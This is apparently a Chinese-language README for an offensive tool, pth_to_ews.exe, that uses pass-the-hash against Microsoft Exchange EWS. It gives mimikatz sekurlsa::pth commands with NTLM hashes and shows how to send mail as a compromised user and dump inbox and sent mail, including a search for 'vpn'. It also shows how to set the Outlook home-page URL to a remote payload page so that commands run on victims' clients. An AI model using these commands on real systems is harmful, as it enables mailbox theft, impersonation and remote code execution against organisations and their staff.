# 使用说明

## 前人工具局限

### 1. ntlmRelayToEWS.py  该工具主要应用于 ntlmv1 ntlmv2 hash的中继劫持验证ews接口，ntlmv1 ntlmv2 中继都只能在认证过程中劫持，无法反复利用。         
ntlmv1 ntlmv2 hash获取需配合unc路径触发

```
ntlmRelayToEWS.py -t https://mail.xxx.net/EWS/exchange.asmx -r setHomePage -f inbox -u http://test.org/cacheimg/xxxxxxxxxxxxxxxxx.html
```

### 2. ruler 该工具go语言编写 1.ews接口爆破账号密码 2. outlook规则创建执行命令 3.outlook home url创建命令执行
代码中使用exchange自动发现协议，利用autodiscover/autodiscover.xml来查找相关接口,有些公司exchange邮件服务器并未启用autodiscover


## 编写目的:

不考虑relay中继的情况下 ,解决在域渗透过程中，ntds.dit抓出来的ntlm hash解不出来明文， 无法登陆exchange owa查看邮件。 

利用指定exchange的ews接口 用mimikatz pth后，可直接操作收发邮件，以及通过修改设置outlook-home-Url 在outlook客户端所属win客户端执行命令


使用说明：

tips:可以使用mimikatz 进行ntlm pth 然后即可使用其他用户凭据进行发送邮件

```
mimikatz.exe privilege::debug "sekurlsa::pth /user:xxxxxxx-hr /domain:corp.xxx.net /ntlm:e00cae2eee1977cec78e888888888888 /run:cmd" exit
mimikatz.exe privilege::debug "sekurlsa::pth /user:xxxxxxxxxxxx-it /domain:corp.xxx.net /ntlm:72abd45c3af888888963e86d9c888888 /run:cmd" exit
```

### 1.Sendmail

使用默认凭证发送邮件, html.txt 为自定义的正文内容      支持html格式                    

```
pth_to_ews.exe https://sb/ews/exchange.asmx -Sendmail -T "sbsbsbsb" -TM 123123@qq.com -B HTML.txt
```
使用账号密码发送邮件

```
pth_to_ews.exe https://sb/ews/exchange.asmx -U sb@sb.net -P ddddd!@#$ -Sendmail -T "你好" -TM sb@test.cn -B HTML.txt
```

### 2. Get Inbox|SentItems Mail:

使用默认凭证收取 收件箱邮件

```
pth_to_ews.exe https://sb/ews/exchange.asmx -MType Inbox                 //保存在目录下的inbox文件夹中为eml格式
```

使用默认凭证收取SentItems邮件

```
pth_to_ews.exe https://sb/ews/exchange.asmx -MType SentItems
```

使用默认凭证收取邮件 检索关键字vpn

```
pth_to_ews.exe https://mail.xxx.net/ews/exchange.asmx -MType SentItems -Filterstring "vpn"
```

使用账号密码收取邮件

```
pth_to_ews.exe https://sb/ews/exchange.asmx -U sb@sb.net -P xxxx!@#$ -MType Inbox
```


使用账号密码收取邮件 检索关键字vpn

```
pth_to_ews.exe https://sb/ews/exchange.asmx -U sb@sb.net -P ssss!@#$ -MType Inbox -Filterstring vpn
```

### 3. Set Outlook HomePage Inbox Url 攻击利用 _已测试exchenge2010 outlook2010/2013

使用默认凭证验证ews接口设置outlook 客户端主页，url为远程pyloadurl,html里面写payload。             

homepage的文章 https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/

```
pth_to_ews.exe https://mailxxxo.net/ews/exchange.asmx -Purl http://www.test.org/cacheimg/ceshi.html -Type Set
```

Reset参数为删除设置outlook 客户端主页

```
pth_to_ews.exe https://maxxx.net/ews/exchange.asmx -Purl http://www.test.org/cacheimg/ceshi.html -Type Set
```


使用账号密码设置outlook 客户端主页url，url为远程pyloadurl,html里面写payload

```
pth_to_ews.exe https://mail.xxx..net/ews/exchange.asmx -U i-xxxx@xxx.xxxx.xxx -P xxxx!@#$% -Purl http://www.test.org/cacheimg/ceshi.htmll -Type Set
```



